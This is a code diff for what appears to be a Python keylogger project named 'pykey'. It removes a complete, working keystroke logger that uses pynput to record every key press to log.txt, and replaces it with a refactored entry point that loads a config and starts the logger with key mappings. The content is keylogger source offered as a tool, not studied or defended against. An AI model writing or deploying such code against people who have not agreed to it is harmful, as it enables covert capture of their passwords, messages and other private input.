@@ -1,17 +1,12 @@
-from pynput.keyboard import Listener
+from pykey.config import load_config
+from pykey.logger import start_logger
 
-def writeto_file(key):
-    data = str(key)
-    data = data.replace("'","")
+def main():
+    # Load configuration
+    config = load_config()
     
-    if data == 'key.space':
-        data = ' '
-    if data == 'key.enter':
-        data = "\n"
-    
-    with open("log.txt", "a") as f:
-        f.write(data)
+    # Start logger
+    start_logger(config["log_file"], config["key_mappings"])
 
-with Listener(on_press = writeto_file) as l:
-    l.join()
-
+if __name__ == "__main__":
+    main()
